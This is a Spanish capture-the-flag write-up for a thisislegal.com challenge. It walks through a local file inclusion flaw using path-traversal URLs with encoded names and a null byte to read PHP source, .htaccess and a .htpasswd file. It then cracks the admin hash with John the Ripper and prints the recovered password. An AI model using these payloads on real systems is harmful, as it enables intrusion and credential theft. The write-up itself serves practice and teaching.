@@ -1,0 +1,37 @@
+Explore todo el sitio a fin de encontrar alguna vulnerabilidad y la siguiente pagina tenia una vulnerabilidad de file inclusion:
+
+http://www.thisislegal.com/newr/src/read.php?customer=
+
+Lo particular de esta pagina era que modificaba el valor del archivo que se leia por una sustitucion en el codigo, esto me permitio explorar el codigo de las otras paginas y encontre un codigo interesante en este enlace:
+
+http://www.thisislegal.com/newr/src/read.php?customer=../beqre2.cuc&00
+
+Mostraba la siguiente lineas de codigo, como punto interesante se encontraba la direccion del archivo secure/orders.db:
+
+alert('Request Submitted, thank you');location.href='index.php';"; $File = "secure/orders.db"; $fh = fopen($F­ile, 'a'); $stringData = $_POST['name'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['email'] . "\n"; @fwrite($fh, $stringData); $stringData = $_POST['site'] . "\n"; @fwrite($fh, $stringData); @fclose($fh); } ?> 
+
+Intente acceder a este archivo pero se encontraba protegido con contraseña:
+
+http://www.thisislegal.com/newr/secure/orders.db
+
+Buscando como resolver esta situacion intente ingresar al archivo .htaccess, pude leer el contenido de ese archivo y me di cuenta la existencia de un archivo de contraseñas .htpasswd:
+
+http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugnpprff&00
+
+		AuthName "Password Protected Area" AuthType Basic AuthUserFile /home/thisi30/public_html/newr/secure/.htpasswd Require valid-user 
+
+http://www.thisislegal.com/newr/src/read.php?customer=../frpher/.ugcnffjq&00
+
+		admin:adzN92vpWgSP6 
+
+Logre extraer la informacion de la contraseña pero era un hash md5, por lo que use john the ripper para adivinar la dicha contraseña, el unico detalle de este metodo es que habia que dar formato al archivo de entrada de john de la siguiente forma para que este fuese procesado:
+
+echo "admin:adzN92vpWgSP6:3:3::/bin/sh:/root" > pass
+john pass
+		Contraseña:
+			admin:vimto
+
+Al tener la contraseña ingrese al directorio y finalmente se puede resolver el reto haciendo click en el siguiente enlace: 
+
+http://www.thisislegal.com/newr/secure/index.php
+
